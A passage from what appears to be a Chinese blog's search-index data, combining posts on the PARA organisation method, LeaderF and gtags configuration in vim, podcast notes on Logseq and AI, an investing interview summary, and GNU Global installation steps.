它需要灵活适应你在不同人生阶段的需求,同时也需要全面,这样你可以在存储信息的各个地方使用它,比如你的电脑文件系统、云存储平台(如Dropbox或谷歌云端硬盘)或者数字笔记应用。 但是最重要的是,理想的组织系统能够直接带来工作和生活中的实实在在的好处。它会极大地加速你完成最重要的项目和实现目标。 换句话说, 组织你的生活的最佳系统,是可操作的。 它不会给你制造更多障碍,不会推迟那些能带来进步的行动,而是让这些行动更接近和更容易开始与完成。 通过十多年的个人实践、指导数千学生以及辅导世界级专业人士,我已经制定出这样的系统。 它被称为PARA - 一个简单、全面的且极其灵活的系统,可以组织任何类型的数字信息,跨任何平台。 我向你保证,它不仅能把你的生活井井有条,还能让你掌握一套工具,巧妙地掌控信息流,以实现你设想的一切。 包含你整个生活的4个类别PARA 基于一个简单的观察:只有4个类别涵盖了你生活中的所有信息。 你有正在积极推进的项目 - 短期努力 (在工作或私人生活中),你以某种目标为指导而进行。例如: 完成网页设计 买一台新电脑 写研究报告 改造浴室 完成西班牙语课程 布置新的客厅家具 你有责任领域 - 需要持续关注的工作和生活中的重要部分。可能包括: 工作责任,比如市场营销、人力资源、产品管理、研发、或工程 个人责任,比如健康、财务、孩子、写作、汽车、或家庭 然后你对一系列感兴趣的主题有资源,比如: 平面设计 个人效率 有机园艺 咖啡 现代建筑 网页设计 日语 法国文学 笔记 气功 习惯养成 摄影 营销资产 最后,你有档案, 包括前三类不再活跃但你可能想保存以供未来参考的任何内容: 你完成或搁置的项目 不再相关或活跃的领域 你不再感兴趣的资源 就是这样!四个顶层文件夹 —— 项目、领域、资源和档案 —— 每个包含少量专门针对你生活中的每个活动项目、责任领域、资源和档案的子文件夹。 你可能难以相信,一个复杂的、现代的人生就像你的,能被简化成只有4个类别。你可能觉得你要处理的远比这样一个简单的系统能容纳的要多。 但这正是要点:如果你的组织系统和你的生活一样复杂,那么维护它的需求最终会夺走你生活所需的时间和精力。 你用来组织信息的系统必须非常简单,以至于它能释放你的注意力,而不是占用更多注意力。 你的系统必须给你节省时间,而不是占用时间。 关键原则 - 按项目(Project)和目标(Goal)组织信息我们大多数人首先在学校里学会如何组织信息。我们被教导根据学科,比如数学、历史或化学,来分类我们的课堂笔记、讲义和学习材料。 但然后在不知不觉中,我们又将这种做法带入了成人生活。我们继续根据非常宽泛的主题比如“市场营销”、“心理学”、“商业”或“思想”来分类我们的文档和文件。 这在你的学业之后的职业生涯中是完全没有意义的。在工作场所,没有课程,没有考试,没有成绩,也没有文凭。没有老师会告诉你应该记下什么来准备期末考试,因为根本就没有考试。 你在工作和生活中所拥有的,是你正在努力实现的结果。你正在努力推出新产品,计划家庭度假,做出关键决定,在你的社区找到托儿所,发表新的写作,或实现季度销售目标。 在繁忙的一天中,当你正在努力使这些事情发生时,你绝对没有时间在一个广阔的类别如“心理学”中搜寻你需要的那一点信息。 与在学校里根据广泛的学科分类信息不同,我建议你根据你现在致力于的项目和目标来组织信息。这就是“按可操作性组织”这个我将在本书中反复强调的箴言的含义。 比如,当你坐下来处理一个图形设计项目时,你需要与该项目相关的所有笔记、文档、资产和其他材料都集中在一起,随时可用。 这似乎很明显,但这正是大多数人所做的完全相反。大多数人倾向于把所有相关材料散布在十几个不同的地方,找到它们需要花费他们半小时的时间。 如何确保与每个项目或目标相关的所有材料都集中在一起?你从一开始就按那种方式组织它们。这样你就知道该把每样东西放在哪里,以及哪里可以找到它们。 按项目组织的力量我在旧金山湾区作为生产力教练工作了几年。那是科技繁荣的鼎盛时期,世界上一些最具影响力的公司的高管都在寻求任何提高表现的方法。我很乐意提供帮助。 我为南旧金山一家著名的生物技术公司的几位高管进行了指导,他们位于一座俯瞰海湾的美丽校园内。我还记得一天,在等待下一个客户——一位负责开发几种新型救生药物的高级主管时,外面是美丽的春日。 他到达后,我们的指导课就像其他每一次一样,从我的一个简单问题开始:“你有项目列表吗?” 当作为生产力教练与客户合作时,我总会首先要求他们展示项目列表。我需要它来了解他们的工作类型、当前工作量和他们正在努力推进的优先事项和结果。 他说“当然!”然后迅速记下从记忆中涌现的列表(第一个警告信号),递给我一个类似下面这样的列表: 你看到问题了吗?再仔细看看。 根据我们之前的定义,列表上的项目一个都不是。“战略规划”什么时候会永久结束?什么时候你可以从列表上永久删除“度假”?希望不会吧! 事实上,这个列表上的每一项都是一个责任领域。这可能看似语义学,但绝不是。我了解到,无论你多聪明多努力,如果不将责任领域细分为具体的项目,有两件关键的事你无法做到。 1. 你无法真正知道你的承诺有多少我经常听到的一个最常见的抱怨是人们“没有带宽”。我能理解——大部分时间你觉得自己的任务过多对不对? 但是只要你继续以领域的视角看待工作,你就永远不会很清楚你的任务有多少。看上面的列表,“招聘”代表的工作量有多大呢?可能是每6个月兼职招聘一次,也可能是这个季度招聘50个职位。 光看一眼根本无法知道,这种不确定性会表现为每个领域感觉都比实际更繁重。 想象一下,如果你确定招聘中的每个项目,并每天将这个列表放在面前。判断还剩下多少工作要做,以及接下来应该做什么,不是会容易很多吗?例如: 2. 你无法将当前的努力连接到长期目标知识型工作最具挑战性(也最令人满足)的一个方面是它需要我们的创造力。而创造力若没有动力感很难持续。如果身心耗尽和士气低落,你就无法继续做出最好的思考和贡献最好的想法。 我们的动力取决于什么?主要是持续的进步。如果知道正在朝着某个方向前进,我们可以在短期内忍受相当大的压力和挫折。 这就带我们到了第二个问题:没有各个项目的列表,你无法将当前的努力连接到长期目标。 再看看上面的列表。其中的项目都不会结束或改变——这是责任领域的定义,它会无限期地持续。现在想象一周又一周,一个月又一个月,甚至一年又一年醒来面对完全相同的永无止境的责任列表。无论你工作多努力,那无边的地平线似乎永远不会更近。 老实说,如果我想设计一个更好的方式来扼杀你的动力,我都想不出来。 当你将责任分解成容易管理的项目时,你可以确保项目列表会不断更新。每当成功完成一个项目就会有定期的成就感。想象一下,通过将广泛的“活动”领域细分成你正在举办的每个活动,会有多大的动力和成就感: 无论你的责任有多广泛,你总能将它们细分为更小的项目。而你必须这样做,如果你想知道自己是否真正在朝目标迈进。 为你想要的生活方式组织信息使用PARA不仅仅是创建一堆文件夹来放东西。 它是关于确定你的工作和生活的结构——你负责了什么,你想改变什么,你想去哪里。它是以一种支持和构建你想要的未来生活的方式来组织信息。 我们所说的“组织”中的很多本质上是伪装的拖延。我们告诉自己我们在“做准备”或“进行研究”,假装这是进步。但实际上,我们在寻找任何小事来打磨或整理,以避免面对我们所憎恶的任务。 PARA看穿了这层外壳,给了我们一种组织任何东西的方法,它非常简单到没有任何借口,除了下一步必要的行动之外再无其他。这是一种极简的方式,只添加到你的环境中刚刚足够的顺序,使你有清晰度来前进,没有更多。 外面还有其他更复杂、更精细和更专业的组织信息的方式,但PARA是唯一经得起时间考验的,因为它给你的时间比它占用的时间更多。","link":"/cn/PARA/"},{"title":"在 vim 中使用 LeaderF 和 gtags","text":"☆ 缘由和一些 vim 历史前些年 vim 没有子窗口的概念，日本的一个 vim 插件作者为了解决这个问题生撸了一套流程，当时 unite.vim 横空出世惊艳了我一把。后面随着技术发展，neovim 和 vim 先后引入了 floating window ，这才使得情况变得好了一点。 https://github.com/vim/vim/blob/master/runtime/doc/popup.txthttps://neovim.io/doc/user/api.html#api-floatwin 得益于新技术，在 vim 中使用 LeaderF 插件的交互体验上了一个台阶。 neovim 从 0.9 版本开始放弃对 cscope 的支持 https://twitter.com/Neovim/status/1580933880579641344 这给我阅读源码造成了一些问题，虽然 vim 仍然可以使用 cscope，但 vim 的启动速度不如 nvim 快，所以我开始寻找替代方案。同时，我发现 denite.nvim，unite.vim，作者也不怎么维护了，一想似乎是很多年没有维护 vim 配置了。 在网络上搜索在 neovim 上阅读源码的方法，无意发现有人提到用 LeaderF 替代 tagbar，于是有了现在的这篇文章。 ☆ 安装vim 插件 LeaderF插件的仓库地址：https://github.com/Yggdroot/LeaderF/tree/master 使用 Vundle.vim 安装，在 .vimrc 中添加下面一行 1Plug 'Yggdroot/LeaderF', { 'do': ':LeaderfInstallCExtension' } 在 vim 中执行下面命令，即可成功安装，如果遇到网络问题，自己挂上线路即可。 12：so %:PlugInstall ☆ LeaderF 配置123456789101112let g:Lf_WorkingDirectoryMode = 'Ac'let g:Lf_RootMarkers = ['.git', '.svn', '.hg', '.project', '.root']let g:Lf_DefaultExternalTool='rg'let g:Lf_WindowPosition = 'popup'let g:Lf_UseCache = 0let g:Lf_PreviewInPopup = 1&quot;let g:Lf_CacheDirectory = s:cachedirlet g:Lf_ShowHidden = 1 &quot;show hidden files&quot; preview or notlet g:Lf_PreviewResult = {'Function': 0, 'BufTag': 0 } g:Lf_WorkingDirectoryMode = ‘AF’ 设置工作目录，如果没有找到 RootMarker 以当前文件所在目录作为工作目录 12345678910111213141516171819g:Lf_WorkingDirectoryMode *g:Lf_WorkingDirectoryMode* This option customizes LeaderF's working directory. e.g., &gt; let g:Lf_WorkingDirectoryMode = 'Ac'&lt; c - the directory of the current working directory.(default) a - the nearest ancestor of current working directory that contains one of directories or files defined in |g:Lf_RootMarkers|. Fall back to 'c' if no such ancestor directory found. A - the nearest ancestor of current file that contains one of directories or files defined in |g:Lf_RootMarkers|. Fall back to 'c' if no such ancestor directory found. f - the directory of the current file. F - if the current working directory is not the direct ancestor of current file, use the directory of the current file as LeaderF's working directory, otherwise, same as 'c'. Note: if &quot;f&quot;, &quot;F&quot; is included with &quot;a&quot; or &quot;A&quot;, use the behavior of &quot;f&quot; or &quot;F&quot;(as a fallback) when a root can't be found. g:Lf_DefaultExternalTool 索引文件使用的外部工具，可选值为 ‘rg’, ‘pt’, ‘ag’, ‘find’，作者推荐使用 rg g:Lf_UseCache 列文件时是否使用缓存，默认值为 1，设置为 0 不使用缓存 g:Lf_WindowPosition，LeaderF 窗口的位置，可选值有 top, bottom, left, right, popup,fullscreen，默认值为 bottom g:Lf_PreviewInPopup 设置是否在 LeaderF 的 popup 窗口显示预览, 默认值为 0 g:Lf_ShowHidden 是否显示隐藏文件和目录，默认值为 0 不显示隐藏文件 g:Lf_PreviewResult 设置需要显示预览的内容，默认值为全 1123456789101112let g:Lf_PreviewResult = { \\ 'File': 1, \\ 'Buffer': 1, \\ 'Mru': 1, \\ 'Tag': 1, \\ 'BufTag': 1, \\ 'Function': 1, \\ 'Line': 1, \\ 'Colorscheme': 1, \\ 'Rg': 1, \\ 'Gtags': 1 \\} 配置好了 LeaderF，在 vim/neovim 的命令行输入 :Leaderf tab 就可以看到相关的命令了，如果忘记了具体的命令也没有关系，使用 LeaderfSelf 即可列出所有的 Leaderf 命令。如何想查看具体命令的使用方法，在命令窗口输入 :Leaderf -h 1234567891011121314151617181920212223subcommands: {file,tag,function,mru,searchHistory,cmdHistory,help,line,colorscheme,gtags, self,bufTag,buffer,rg,filetype,command,window,quickfix,loclist,jumps} file search files tag navigate tags using the tags file function navigate functions or methods in the buffer mru search most recently used files searchHistory execute the search command in the history cmdHistory execute the command in the history help navigate the help tags line search a line in the buffer colorscheme switch between colorschemes gtags navigate tags using the gtags self execute the commands of itself bufTag navigate tags in the buffer buffer search buffers rg grep using rg filetype navigate the filetype command execute built-in/user-defined Ex commands. window search windows. quickfix navigate the quickfix. loclist navigate the location list. 好了，我可以放弃 fzf.vim, ctrp.vim, tagbar, unite.vim, denite.vim 等一系列 vim 插件了。 在日常使用中，每次都输入那么长的命令不太方便，我们可以配置以下容易记忆的快捷键。 1234567noremap &lt;leader&gt;fs :LeaderfSelf&lt;cr&gt;noremap &lt;leader&gt;fm :LeaderfMru&lt;cr&gt;noremap &lt;leader&gt;ff :LeaderfFunction&lt;cr&gt;noremap &lt;leader&gt;fb :LeaderfBuffer&lt;cr&gt;noremap &lt;leader&gt;ft :LeaderfBufTag&lt;cr&gt;noremap &lt;leader&gt;fl :LeaderfLine&lt;cr&gt;noremap &lt;leader&gt;fw :LeaderfWindow&lt;cr&gt; 值得一提的是 rg 命令，可以直接在目录文件内搜索字符串，ripgrep 的正则表达式比 vim 的正则要正常多了。vim 的正则表达式的用法可以参见：https://vimdoc.sourceforge.net/htmldoc/pattern.html以前我为了规避 vim 的正则使用了一个插件 https://github.com/othree/eregex.vim 现在这个插件也不需要了。 要利用 LeaderF 调用 rg 命令，可以使用命令行 :Leaderf! rg, 为了方便使用使用下面的快捷键查询光标所在 word 1nmap &lt;leader&gt;frb &lt;Plug&gt;LeaderfRgCwordLiteralBoundary 运行 LeaderF 之后的操作在执行 Leaderf 命令弹出的界面后，需要使用特定的快捷键进行操作，这些快捷键可以使用 help leaderf-prompt 进行查看。 1234567891011121314151617181920212223242526272829Once LeaderF is launched: *prompt* *leaderf-prompt* &lt;C-C&gt;, &lt;ESC&gt; : quit from LeaderF. &lt;C-R&gt; : switch between fuzzy search mode and regex mode. &lt;C-F&gt; : switch between full path search mode and name only search mode. &lt;Tab&gt; : switch to normal mode. &lt;C-V&gt;, &lt;S-Insert&gt; : paste from clipboard. &lt;C-U&gt; : clear the prompt. &lt;C-W&gt; : delete the word before the cursor in the prompt. &lt;C-J&gt;, &lt;C-K&gt; : navigate the result list. &lt;Up&gt;, &lt;Down&gt; : recall last/next input pattern from history. &lt;2-LeftMouse&gt; or &lt;CR&gt; : open the file under cursor or selected(when multiple files are selected). &lt;C-X&gt; : open in horizontal split window. &lt;C-]&gt; : open in vertical split window. &lt;C-T&gt; : open in new tabpage. &lt;F5&gt; : refresh the cache. &lt;C-LeftMouse&gt; or &lt;C-S&gt; : select multiple files. &lt;S-LeftMouse&gt; : select consecutive multiple files. &lt;C-A&gt; : select all files. &lt;C-L&gt; : clear all selections. &lt;BS&gt; : delete the preceding character in the prompt. &lt;Del&gt; : delete the current character in the prompt. &lt;Home&gt;: move the cursor to the begin of the prompt. &lt;End&gt; : move the cursor to the end of the prompt. &lt;Left&gt;: move the cursor one character to the left. &lt;Right&gt; : move the cursor one character to the right. &lt;C-P&gt; : preview the result. &lt;C-Up&gt; : scroll up in the popup preview window. &lt;C-Down&gt; : scroll down in the popup preview window. tab : 切换输入模式和 normal 模式，进入 normal 模式后可以使用 j 和 k 上下移动光标来查看文件。 q : normal 模式中，退出 LeaderF 在输入模式下，可以使用下面的快捷键进行分屏显示。 ctrl + x : 横向分割 ctrl + ] : 竖向分割 ctrl + T : tab 分割 ☆ LeaderF + gtags 的配置gtags 和 LeaderF 配置起来使用，实在是很不错。首先要配置好 gtags，关于 global 的安装详见 GNU Global 的使用，这里就不再详细说了，gtags 的配置添加下面两行即可。 12let $GTAGSLABEL='native-pygments'let $GTAGSCONF='/usr/local/share/gtags/gtags.conf' 配置好系统 gtags，global ，gtags.conf 的正确路径。 1234let g:Lf_Global = '/usr/local/bin/global'let g:Lf_Gtags = '/usr/local/bin/gtags'let g:Lf_Gtagsconf = '/usr/local/share/gtags/gtags.conf'let g:Lf_Gtagslabel = 'native-pygments' 下面两行是配置gtags 自动生成 tags 文件，主要是三个文件 GPATH , GRTAGS GTAGS 12let g:Lf_GtagsAutoGenerate = 1let g:Lf_GtagsAutoUpdate = 1 g:Lf_GtagsAutoGenerate 是否自动生成 tags 文件。设置成 1 并且在 g:Lf_RootMarkers 定义的目录中，tags 会自动生成 g:Lf_GtagsAutoUpdate 是否自动更新 tags。如果设置成 0 ，需要先执行 Leaderf gtags --update 手动更新 tags 文件 tags 文件生成的目录和 g:Lf_CacheDirectory 的配置相关， g:Lf_CacheDirectory 用于设置缓存文件目录，默认的目录是 $HOME (Windows 上会有变化)使用 _ 替换了 / 。 12ls ~/.LfCache/gtags/_home_henices_.vim GPATH GRTAGS GTAGS 完成了上面的配置后，我们就可以正常使用 LeaderF 来对 gtags 生成的 tags 文件进行浏览了，在命令行使用 :Leaderf gtags -h 可以看到详细的命令。 123456789101112131415161718192021:Leaderf gtags -husage:Leaderf[!] gtags [-h] [--remove] [--recall]Leaderf[!] gtags --update [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [--accept-dotfiles] [--skip-unreadable] [--skip-symlink [&lt;TYPE&gt;]] [--gtagslibpath &lt;PATH&gt; [&lt;PATH&gt; ...]]Leaderf[!] gtags [--current-buffer | --all-buffers | --all] [--result &lt;FORMAT&gt;] [COMMON_OPTIONS]Leaderf[!] gtags -d &lt;PATTERN&gt; [--auto-jump [&lt;TYPE&gt;]] [-i] [--literal] [--path-style &lt;FORMAT&gt;] [-S &lt;DIR&gt;] [--append] [--match-path] [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [COMMON_OPTIONS]Leaderf[!] gtags -r &lt;PATTERN&gt; [--auto-jump [&lt;TYPE&gt;]] [-i] [--literal] [--path-style &lt;FORMAT&gt;] [-S &lt;DIR&gt;] [--append] [--match-path] [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [COMMON_OPTIONS]Leaderf[!] gtags -s &lt;PATTERN&gt; [-i] [--literal] [--path-style &lt;FORMAT&gt;] [-S &lt;DIR&gt;] [--append] [--match-path] [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [COMMON_OPTIONS]Leaderf[!] gtags -g &lt;PATTERN&gt; [-i] [--literal] [--path-style &lt;FORMAT&gt;] [-S &lt;DIR&gt;] [--append] [--match-path] [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [COMMON_OPTIONS]Leaderf[!] gtags --by-context [--auto-jump [&lt;TYPE&gt;]] [-i] [--literal] [--path-style &lt;FORMAT&gt;] [-S &lt;DIR&gt;] [--append] [--match-path] [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [COMMON_OPTIONS][COMMON_OPTIONS]: [--reverse] [--stayOpen] [--input &lt;INPUT&gt; | --cword] [--top | --bottom | --left | --right | --belowright | --aboveleft | --fullScreen] [--nameOnly | --fullPath | --fuzzy | --regexMode] [--nowrap] [--next | --previous]... LeaderF gtags 最常用的 :Leaderf[!] gtags -d/-r/-s/-g， 具体的作用如下所示，! 表示直接进入 normal 模式。 123456789--gtagslibpath &lt;PATH&gt; [&lt;PATH&gt; ...] Specify the paths to search for library functions.-d &lt;PATTERN&gt;, --definition &lt;PATTERN&gt; Show locations of definitions.-r &lt;PATTERN&gt;, --reference &lt;PATTERN&gt; Show reference to a symbol which has definitions.-s &lt;PATTERN&gt;, --symbol &lt;PATTERN&gt; Show reference to a symbol which has no definition.-g &lt;PATTERN&gt;, --grep &lt;PATTERN&gt; 日常使用中，同样可以配置快捷键方便使用，下面的快捷键将对光标所在单词进行 tag 查找。 1234nmap &lt;leader&gt;fgd &lt;Plug&gt;LeaderfGtagsDefinitionnmap &lt;leader&gt;fgr &lt;Plug&gt;LeaderfGtagsReferencenmap &lt;leader&gt;fgs &lt;Plug&gt;LeaderfGtagsSymbolnmap &lt;leader&gt;fgg &lt;Plug&gt;LeaderfGtagsGrep 运行 LeaderF gtags 之后使用 LeaderF + gtags 跳转到源码后，如果想继续跳转到下一个或者上一个 tag 可以使用 Leaderf gtags --next 和 Leaderf gtags --previous 123noremap &lt;leader&gt;fgn :&lt;C-U&gt;&lt;C-R&gt;=printf(&quot;Leaderf gtags --next %s&quot;, &quot;&quot;)&lt;CR&gt;&lt;CR&gt;noremap &lt;leader&gt;fgp :&lt;C-U&gt;&lt;C-R&gt;=printf(&quot;Leaderf gtags --previous %s&quot;, &quot;&quot;)&lt;CR&gt;&lt;CR&gt; ☆ LeaderF 的其他用法LeaderF 还可以和 Gutentags 配合使用进行源码浏览，但已经超出本文内容，有兴趣者可以查阅网络上的其他资料。 ☆ 参考资料https://github.com/Yggdroot/LeaderF/blob/master/doc/leaderf.txthttps://retzzz.github.io/dc9af5aa/https://github.com/Yggdroot/LeaderF/blob/master/README.mdhttps://zhuanlan.zhihu.com/p/36279445https://github.com/vim/vim/blob/master/runtime/doc/popup.txthttps://neovim.io/doc/user/api.html#api-floatwin","link":"/cn/vim_gtags_leaderf/"},{"title":"对话logseq联合创始人，看硅谷大佬的传奇投资 总结","text":"https://pca.st/x398eeq0 技术招聘时，有 side project 的优先，认为有 side project 的技术人员大多有自己独特的想法，自驱力也较强。 强调技术热情和学习能力，小众语言会的人不多，但是语言不是主要问题。对于对新技术充满热情和好奇心的技术人来说学习就可以了。 自由开放的团队文化，大都是技术人员，相互之间比较平等，和社区沟通交流紧密。没有明确的 deadline，但大家都比较努力，工作任务分配以兴趣自领为主指派为辅。 没有太多的营销，产品定位和路线也是逐渐明确，最开始是从秦天生的一个 side project 慢慢发展起来。也没有定量分析过产品用户爆炸性增长的原因，只有模糊的感觉，Logseq 内置 PDF 阅读和标注感觉是一个突破点。 Logseq 团队关于远程工作的一些实践，志远认为在一个国际团队中远程工作需要克服时差问题，需要讨论问题的时候比较麻烦。解决的方式是写比较详细的 issue 复现文档，基本是 step by step 的。讨论想法多录制一些演示视频，有问题就直接给对方发消息不能马上回复也问题不大，很多事情没有想象中的重要。 Logseq 团队协作的主要工具，代码问题和 issue 管理使用 Github，问题讨论使用 Discord + 论坛 （Discord 处理即时反馈，论坛主要用来较长时间的讨论）， 团队内部的通讯工具使用 Slack。 Logseq 的投资人非常豪华,我查了一下有 Stripe 首席执行官 Patrick Collison、GitHub 前首席执行官 Nat Friedman、Shopify 创始人 Tobias Lütke、A16Z 总经理 Sriram Krishnan等人，更神奇的是他们大多也是 Logseq 的用户。 听完这期博客，我感觉陈志远是非常纯粹的技术人员，谦逊内敛，对技术充满热爱，喜欢用技术解决现实生活中的问题。坚持自己的产品定位，不浮躁不傲娇，长期认真地完善产品功能，不为短期的生存而感到焦虑，这或许就是小而美的团队的优势吧。","link":"/cn/logseq_interview/"},{"title":"认知被 AI 暴击的瞬间","text":"https://podcasts.apple.com/us/podcast/%E8%AE%A4%E7%9F%A5%E8%A2%ABai%E6%9A%B4%E5%87%BB%E7%9A%84%E7%9E%AC%E9%97%B4/id1614381317?i=1000598827531 今天听了一期「认知被 AI 暴击的瞬间》，里面有几个挺有意思的话题 。 “AGI”技术目前存在的哪些问题 ？首先是算力的问题，早期大家在使用 ChatGPT 的时候应该都遇上了无法响应的情况，包括后来大范围的封号，限制特定机房 IP 段的访问，这些其实都是算力不足的表现。虽然 Google 号称 PaLM 2 的 Gecko 模型可以在手机上运行，具体的文本生成效果和能量消耗情况都没有详细的信息。 其次，ChatGPT 这些 Ai 程序生成的内容并不总能满足需求，有时候甚至觉得有点傻，受限于学习的数据和算法模型，人工智能领域正在挑战其不太擅长的通用人工智能，在专用人工智能方面（比如下围棋）的许多地方，人类早已经不是对手了。 最后，AGI 程序是不能有「价值判断」的，没有价值观就可能生成有害的内容，这些内容甚至可能对人类产生威胁。 人脑和“Ai脑”工作方式的主要区别 ？人脑的特点是以很低的功耗快速响应，这就是人们喜欢宏大叙事和模式识别的原因。按照康德哲学的观念「人为自然界立法」，客观对象即人的认识对象不是在那里等着你去认识，而是由你的认识过程能动地建立起一个对象。 大语言模型 (LLM)则是通过对大规模语料库的训练和自然语言处理技术的应用，使得模型能够理解和生成自然语言，并能够执行各种语言任务，如文本生成、机器翻译、语音识别等。 人类应该担心被 Ai 取代，甚至还有点恐惧吗 ？首先，我们应该充分利用 Ai 的能力来完成各种任务，Ai 应该作为人类的 「副驾」而非竞争对手。在国际象棋上出现了人和 ai 相结合的程序，自动判断什么情况用 Ai 判断，什么情况用人类判断，据说打败了不少 master 模型。 Will 老师则提出一个「工具人」概念，只能执行任务没有自己的思想就是工具人。人类和 Ai 的关系可以简单地理解为把机器的工作还给机器，这也会带来生产力的大幅提高。 另外，Ai 是没有价值判断和整合能力的，Ai 可以快速阅读财务报表，快速生成各种基面本信息，但是问 Ai 到底该投资哪家公司，你能相信 Ai 的结论吗 ？或者你用 Ai 生成了一份投研报告交给老板，老板觉得挺好，但可能还是会问你具体的看法，这或许又回到了另一个问题，真的就完全相信 Ai 吗","link":"/cn/ai_thinking/"},{"title":"韩广斌讲投资","text":"韩广斌在采访中提及两个和投资相关的重要概念，沉没成本 和 幸存者偏差。 沉没成本，指已经发生的不可回收的成本，从理性角度讲和当前决策无关，而实际上却对人的决策有重大影响。受沉没成本的影响，人们可能无法迅速纠正错误，无法快速砍仓。假设买入茅台时50元，茅台涨到100元，成本就是100元了，应该基于当下去评估。 幸存者偏差，属于典型的归因错误。解释没有意义，正确的预测才有价值。常见有人说我几年前看好宁德时代，宁德时代也涨了，但是上涨的原因很可能不是人们所说的原因。只有立足当下，对行业发展、公司评估、财务分析等方面有自己独到的见解，才能取得超额的收益。 韩广斌在采访中解释了搞清楚似是而非的问题的重要性，似是而非的问题和幸存者偏差有关，需要明白事物的深层次原因。明显正确和明显错误的问题都比较容易理解，关键就是似是而非的问题，重点分析似是而非的问题，使得你对事物的理解和他人相比所有不同。这些不同的理解就是投资成功的关键，有时候是预期差，也可能是其他不同的看法。 解决「似是而非」问题的方法，首先要意识到人的认知是存在偏见的，要以开放的思维和心态去看待问题。开放意味着要去倾听别人的意见和市场的声音，如果反馈和设想的不一致就要反思自己的投资逻辑，投资的过程也是不断“纠错”的过程。但投资中需要过滤小的噪音，避免陷于细节而不可自拔，抓住主要矛盾，主要关注大的错误。 从采访的内容看和林园相比韩广斌更像是价值投资者，看韩广斌早期的视频，总结了一下他的投资理念：长期价值投资者，投资未来的绩优股，回避问题股，公司的管理层很重要 （诚实、正直），追求确定性和回报率。 韩广斌说在国内，好的企业家太少，大多数公司的管理者是老板。他心目中好公司的定义：好的行业，好的业绩，好的管理层，对员工好，对股东也好。 新思哲在平时构建可投资的股票池，根据不同的周期选择不同的股票形成投资组合，组合中的股票较为分散在一定程度上形成对冲，从而使业绩更加平滑。在追求回报率上，我觉得和私募有关系，希望通过业绩来扩大规模，另外目前新思哲的规模还是不太大，可以较为快速地调整策略。 韩广斌的「养猪理论」，猪从50斤长到200斤的成长速度是最快的，投资公司最好选择上市公司竞争优势形成并且成长加速的阶段介入，重点投资公司从优秀到卓越的过程。 韩广斌对投资者的一些建议： 坚持长期主义: 相信把一些本分、基础的事情做好，长期能带来可观的回报。 做预期可控的投资: 投资最重要的是做 1.2的n次方，20%的回报率，经过努力、专业的操作可以做到。 复利主义: 资金在滚雪球的过程中，心态要平和，追求长期的复利，慢就是快 慎用杠杆: 算清帐，有些 P2P 年化融资成本高达 18%，既使是专业机构也很难保持这个水平 与优秀者同伍: 好的投资机会不多，所以一定要和最优秀的人打交道，和最优秀的企业家打交道。","link":"/cn/interview_guangbinHan/"},{"title":"GNU Global 的使用","text":"☆ 1. GNU Global 简介GNU Global 是一种源代码标记系统，可以帮助程序员在代码库中快速定位函数、变量、宏定义等。GNU Global 可以生成索引文件，用于快速跳转到定义、引用、函数调用等地方，从而提高代码阅读和编辑的效率。 GNU global 具有以下优势： 多语言支持：在默认情况 GNU Global 支持 C, C++, Yacc, Java, PHP4 和 assembly 语言，在安装拓展的情况下可以支持 50多种语言。 完整性：GNU global 可以标记更多符号的位置，如定义、引用、结构体、类，宏定义等。 高效性：GNU global 生成高效的 tag 数据库，节省了磁盘空间，使得查询速度更快，同时也支持增量更新索引文件，这意味着当源代码发生变化时，只需要重新生成变更的部分，而不需要重新生成整个索引文件。 可集成：可以在 Emacs, Vi /vim, Less viewer, Bash shell， 浏览器环境下正常使用 持续更新： https://www.gnu.org/software/global/whatsnew.html 更多信息请参考： https://www.gnu.org/software/global/globaldoc_toc.html 1.3 Features ☆ 2. GNU Global 的安装下载地址： https://ftp.gnu.org/pub/gnu/global/global-6.6.9.tar.gz https://www.gnu.org/software/global/download.html 中说明了源码编译方法： 123% sh reconf.sh % ./configure% make Fedora/Debian 等系统可以使用仓库直接安装，下面以 Fedora Linux 为例 1sudo dnf install global-ctags global cscope 如果不安装 global-ctags 在 Fedora 下可能会报 Cannot enable custom plug-in parser for GNU GLOBAL 的错误。 gtags-cscope 由 global 安装包提供不用另外安装了。 1234567891011sudo dnf whatprovides gtags-cscopeglobal-6.6.5-7.fc37.x86_64 : Source code tag system仓库 ：@System匹配来源：文件名 ：/usr/bin/gtags-cscopeglobal-6.6.5-7.fc37.x86_64 : Source code tag system仓库 ：fedora匹配来源：文件名 ：/usr/bin/gtags-cscope macOS 下可以使用 brew 安装 global，执行 brew install global 即可。参见 https://www.gnu.org/software/global/download.html 如果需要gtags支持 C/C++/Java 之外的语言，需要安装 pygments。 1pip3 install pygments ☆ 3. GNU global 和 cscope, vim 集成vim 的 cscope 支持可能需要重新编译 vim，可以通过下面的命令查询。 12vim --version | grep cscope+cscope +localmap +ruby/dyn +wildignore GNU global 提供了两个 vim 插件用于和 vim 结合，分别为 gtags.vim 和 gtags-cscope.vim，可以直接拷贝到 vim 的插件目录使用。 12cp /usr/local/share/gtags/gtags.vim $HOME/.vim/plugincp /usr/local/share/gtags/gtags-cscope.vim $HOME/.vim/plugin 如果是系统仓库安装路径可能有变化，Fedora 上的 gtags.vim 路径为 /usr/share/gtags/gtags.vim 。 gtags-cscope.vim 定义了一组快捷键和以前的 cscope_maps.vim 一致 12345678:nmap &lt;C-\\&gt;s :cs find s &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;:nmap &lt;C-\\&gt;g :cs find g &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;:nmap &lt;C-\\&gt;c :cs find c &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;:nmap &lt;C-\\&gt;t :cs find t &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;:nmap &lt;C-\\&gt;e :cs find e &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;:nmap &lt;C-\\&gt;f :cs find f 